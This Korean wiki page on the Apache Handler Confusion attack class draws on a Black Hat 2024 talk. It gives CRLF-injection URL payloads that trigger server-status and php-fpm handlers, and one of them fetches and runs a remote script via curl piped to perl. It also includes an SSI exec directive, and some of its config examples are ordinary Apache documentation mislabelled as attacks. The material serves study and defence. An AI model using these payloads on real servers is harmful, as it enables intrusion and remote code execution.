---
title: Apache Handler Confusion
description: 
published: true
date: 2025-07-31T17:46:22.326Z
tags: 
editor: markdown
dateCreated: 2025-07-25T10:03:51.629Z
---

# Apache Handler Confusion

## 개요

“Handler Confusion Attack”은 Apache HTTP Server에서 요청을 처리할 때 사용되는 공통 구조체의 필드(handler, content_type)를 서로 다른 모듈이 상이한 방식으로 해석하는 충돌을 악용한다. 일부 모듈은 handler 필드를 우선시해 실행 경로를 결정하고, 다른 모듈은 content-type을 기준으로 처리 대상 모듈을 결정하며, 이로 인해 동일한 요청이 의도하지 않은 방식으로 처리된다. 공격자는 여기에 CRLF 인젝션을 이용한 Location 헤더 조작을 결합해 handler 선택 로직을 더욱 교란함으로써 원하는 모듈이 호출되도록 유도할 수 있다. 결과적으로 공격자는 정적 리소스처럼 위장한 요청을 통해 동적 코드 실행, 소스 노출, 권한 우회 같은 심각한 보안 문제가 발생한다.

## 분류

> 구문 분석 불일치 (Syntax Parsing Gap)  
> → 구조 해석 불일치 (Structural Interpretation Mismatch)  
> → Apache Handler Confusion

## 절차

| Phase         | Description                                                                                     |
|---------------|-------------------------------------------------------------------------------------------------|
| Reconnaissance| 대상 서버의 Apache 설정 파일에서 SetHandler, AddHandler, Action 등 핸들러 관련 지시어를 수집 및 분석한다. |
| Confusion     | handler와 content_type 간 해석 충돌을 유도하기 위해, 충돌 가능한 지시어를 조합하고 핸들러 선택 로직을 우회하는 구조를 만든다. |
| Evasion       | URL 이중 인코딩, 파라미터 변조 등을 통해 로그 및 WAF를 우회하고, CRLF( `%0d%0a` ) 삽입으로 필터 체인을 조작한다. |
| Validation    | 인코딩 변형 전후의 HTTP 응답 코드 (200/404 등) 차이를 비교하여 핸들러가 바뀌었는지 검증한다. |
| Exploitation  | 잘못된 핸들러가 선택되도록 유도해서 원격 코드 실행(RCE), SSRF/내부 리소스 노출 등을 수행한다. |
| Exfiltration  | SSI 포함 호출 또는 SSRF 경로를 통해 `/etc/passwd`, 세션 쿠키, 환경 변수 파일(.env) 등을 외부로 유출한다. |

<div style="text-align: left;">
  <img
    src="/apache_handler_confusion.png"
    alt="Apache Handler Confusion 다이어그램"
    width="1000"
    style="display: block;
           margin: 0 0 1em 0;
           height: auto;"
  />
</div>

## 공격기법

### Reconnaissance
<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Apache Handler Configuration Discovery</td>
      <td>-</td>
      <td>Apache 설정 파일에서 AddHandler, SetHandler, AddType 등의 지시어를 식별하여, 특정 Content-Type이 어떤 핸들러로 매핑되는지를 분석하여 공격에 필요한 트리거 Content-Type을 사전 탐색할 수 있다.</td>
      <td>[1]</td>
    </tr>
    <tr>
      <td>Local Redirect CGI Enumeration</td>
      <td>-</td>
      <td>CGI 스크립트의 Location 헤더를 반사하는지 확인해, 내부 리디렉트 기능을 지원하는 엔드포인트를 식별하여 이후 Header 조작 기법의 발판을 마련한다.</td>
      <td>[1]</td>
    </tr>
  </tbody>
</table>

### Confusion
<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>ContentType-to-Handler Conversion</td>
      <td>-</td>
      <td>Apache는 요청 처리 시 `r->handler`가 명시되지 않은 경우, `r->content_type` 값을 핸들러 이름으로 자동 설정한다. 이를 악용하면 Content-Type만 조작하여 핸들러를 우회적으로 설정할 수 있다.</td>
      <td>[1]</td>
    </tr>
    <tr>
      <td>Action Handler Misuse</td>
      <td><pre><code># 특정 MIME content type의 파일 요청:
Action image/gif /cgi-bin/images.cgi
# 특정한 확장자를 가진 파일
AddHandler my-file-type .xyz
Action my-file-type /cgi-bin/program.cgi</code></pre></td>
      <td>Action 지시어를 사용해 특정 MIME 타입이나 사전 매핑한 확장자에 대해 외부 CGI를 실행하도록 강제함으로써, 원본 스크립트 대신 공격자가 지정한 핸들러를 호출한다.</td>
      <td>[A]</td>
    </tr>
  </tbody>
</table>

### Evasion
<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>CRLF Injection in Response Header</td>
      <td><pre><code>%0d%0aContent-Type:
application/x-httpd-php%0d%0a%0d%0a</code></pre></td>
      <td>CGI 파라미터에 `%0d%0a` 시퀀스를 삽입하여 HTTP 응답 헤더를 조작할 수 있다. 이를 통해 Content-Type이나 Location을 의도적으로 설정해 핸들러 변조를 유도할 수 있다.</td>
      <td>[1]</td>
    </tr>
  </tbody>
</table>

### Validation
<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Response Code Differential Test</td>
      <td><pre><code>curl -I /admin.php 및 
curl -I /admin.php%3Funused</code></pre></td>
      <td>원본 요청과 인코딩 삽입 요청 간 HTTP 상태 코드 차이(예: 200↔404)를 비교하여 핸들러 혼동으로 인해 처리 방식이 달라졌는지 판단한다.</td>
      <td>[1]</td>
    </tr>
  </tbody>
</table>

### Exploitation
<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Invoke Server-Status Handler</td>
      <td><pre><code>http://server/cgi-bin/redir.cgi?r=
http://%0d%0aLocation:/ooo%0d%0a
Content-Type:server-status%0d%0a%0d%0a</code></pre></td>
      <td>CRLF 인젝션을 통해 Content-Type을 `server-status` 핸들러로 설정해 Apache `mod_status`를 실행시켜 서버 상태 페이지를 유출한다.</td>
      <td>[1]</td>
    </tr>
    <tr>
      <td>External Filter Execution</td>
      <td><pre><code># mod_ext_filter 지시어를 가지고
# 외부 프로그램 /usr/bin/enscript를 사용하여
# 문서파일과 text/c 파일을 HTML로 만들고 결과의
# type을 text/html로 변경하는 필터를 정의한다
ExtFilterDefine c-to-html mode=output \
intype=text/c outtype=text/html \
cmd="/usr/bin/enscript --color -W html -Ec -o - -"
&lt; "/export/home/trawick/apacheinst/htdocs/c">
# 출력에 새로운 필터를 실행하는 core 지시어
SetOutputFilter c-to-html
# .c 파일의 type을 text/c로 만드는 mod_mime
# 지시어
AddType text/c .c
# 디버그 수준을 높여서 요청마다 현재 설정을
# 알려주는 로그문을 기록하는 mod_ext_filter
# 지시어
ExtFilterOptions DebugLevel=1
&lt;/Directory></code></pre></td>
      <td>mod_ext_filter의 FilterProvider 지시어로 정의된 외부 필터를 호출해 시스템 명령을 실행하고, 그 출력을 응답 본문에 삽입한다.</td>
      <td>[C]</td>
    </tr>
  </tbody>
</table>

### Exfiltration
<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>SSI Command Injection</td>
      <td><pre><code>&lt!--#exec cgi="/cgi-bin/example.cgi" --></code></pre></td>
      <td>mod_include가 활성화된 경우, 서버 파싱 대상 파일에 해당 SSI 지시자를 삽입하여 외부 CGI(`/cgi-bin/example.cgi`)를 실행하도록 강제한다.</td>
      <td>[B]</td>
    </tr>
    <tr>
      <td>SSRF via mod_proxy Exfiltration (PEAR)</td>
      <td><pre><code>http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock| fcgi://127.0.0.1/usr/share/php/pearcmd.php %0d%0a %0d%0a</code></pre></td>
      <td>Default PHP Docker 이미지의 `register_argc_argv` 및 PEAR 설치를 이용해, UNIX 소켓 경유 FCGI 핸들러로 pearcmd.php를 실행·프록시 요청하여 내부 스크립트 출력을 외부로 전송한다.</td>
      <td>[1]</td>
    </tr>
    <tr>
      <td>SSRF via mod_proxy Exfiltration (RCE)</td>
      <td><pre><code>http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo?%2b run-tests %2b -ui %2b $(curl${IFS} http://orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock| fcgi://127.0.0.1/usr/share/php/pearcmd.php %0d%0a %0d%0a</code></pre></td>
      <td>UNIX 소켓 경유 FCGI 핸들러를 통해 웹 루트의 index.php를 원격 호출, RCE를 유도하고 실행 결과(예: phpinfo() 출력 등)를 외부에서 확인할 수 있다.</td>
      <td>[1]</td>
    </tr>
  </tbody>
</table>

## 분류에 해당하는 문서

[1] https://i.blackhat.com/BH-US-24/Presentations/US24-Orange-Confusion-Attacks-Exploiting-Hidden-Semantic-Thursday.pdf

## 기타 참고문헌

[A] https://httpd.apache.org/docs/2.4/mod/mod_actions.html  
[B] https://httpd.apache.org/docs/2.4/mod/mod_include.html  
[C] https://httpd.apache.org/docs/2.4/mod/mod_ext_filter.html  
[D] https://httpd.apache.org/docs/2.4/mod/mod_proxy.html

